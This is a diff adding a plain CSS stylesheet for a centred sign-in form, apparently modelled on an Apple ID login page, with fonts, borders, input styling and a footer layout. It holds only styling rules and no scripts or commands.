@@ -1,0 +1,130 @@
+*{
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    list-style: none;
+    text-decoration: none;
+}
+
+body{
+    font-family: SF Pro Text,SF Pro Icons,Helvetica Neue,Helvetica,Arial,sans-serif;
+    color: #98989c;
+}
+
+header{
+    padding: 5px;
+    margin: 10px;
+}
+
+header img{
+    width: 20px;
+}
+
+.main{
+    position: relative;
+    display: flex;
+    justify-content: center;
+    align-content: center;
+    align-items: center;
+    min-height: 85vh;
+}
+
+form {
+    width: 500px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+
+}
+
+#sign h2{
+    /* max-width: 380px; */
+    margin: 5px auto 0px;
+    font-size: 22px;
+    line-height: 1.47059;
+    font-weight: 400;
+    letter-spacing: -.022em;
+    font-family: SF Pro Text,SF Pro Icons,Helvetica Neue,Helvetica,Arial,sans-serif;
+    color: #656569;
+}
+
+#inputText {
+    margin: 5px 0 80px 0;
+}
+
+#appleid {
+    min-width: 350px;
+    padding: 20px;
+     border: .5px solid #d2d2d7;
+    border-radius: 10px;
+    background-repeat: no-repeat;
+    background-position: calc(100% - 20px) center;
+    background-image: url('./input.svg');
+    align-self: center;
+    background-size: 8%;
+}
+
+input #appleid {
+    box-shadow: none;
+    outline: none;
+  -moz-box-shadow: none;
+  -webkit-box-shadow: none;
+    border-color: transparent;
+}
+
+.input2 {
+    text-align: center;
+    min-width: 180px;
+    border-bottom: .1px solid #d2d2d7;
+}
+
+#remember {
+    margin-right: 5px;
+    margin-bottom: 20px;
+}
+
+#r2 {
+    color: #656569;
+}
+
+form h4 {
+    margin-top: 1rem;
+    font-weight: 300;
+}
+
+::placeholder {
+  font-size: 16px;
+  /* font-family: Arial, sans-serif; */
+}
+
+.bx {
+    color: #1975d1;
+    transform: rotate(45deg);
+}
+
+footer{
+    position: absolute;
+    display: flex;
+    width: 100%;
+    height: 65px;
+    padding: 20px;
+    bottom: 0;
+    margin-bottom: 0;
+    background-color: #f5f5f7;
+}
+
+footer p{
+    font-size: 13px;
+    /* margin-top: 10px; */
+}
+
+footer p:nth-child(2) {
+    margin: 0 20px;
+}
+
+
+footer p:nth-child(3){
+    padding-left: 20px;
+    border-left: .5px solid #d2d2d7;
+    
+}
